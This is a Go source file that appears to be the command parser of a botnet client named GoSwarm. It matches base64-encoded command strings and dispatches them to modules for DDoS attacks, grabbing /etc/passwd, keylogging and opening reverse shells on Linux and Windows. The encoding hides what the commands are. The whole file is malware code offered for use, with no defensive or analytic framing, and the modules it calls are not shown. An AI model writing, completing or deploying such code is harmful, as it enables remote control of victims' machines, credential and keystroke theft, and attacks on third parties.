package parser

import (
	"fmt"

	"github.com/Pimmytrousers/GoSwarm/client/modules"
)

func Parse(cmd string) {
	var output = ""
	switch cmd {

	case "RERvUw==":
		output = modules.DDoS()

	case "L2V0Yy9wYXNzd2QNCg==":
		output = modules.GrabPasswd()

	case "a2V5bG9nDQo":
		output = modules.Keylogg()

	case "cmV2ZXJzZVNoZWxsTGludXg=":
		modules.ReverseShellLinux()

	case "cmV2ZXJzZVNoZWxsV2luZG93cw==":
		modules.ReverseShellWindows()

	default:
		fmt.Println("Command not recognized")
	}
	fmt.Println(output)
}
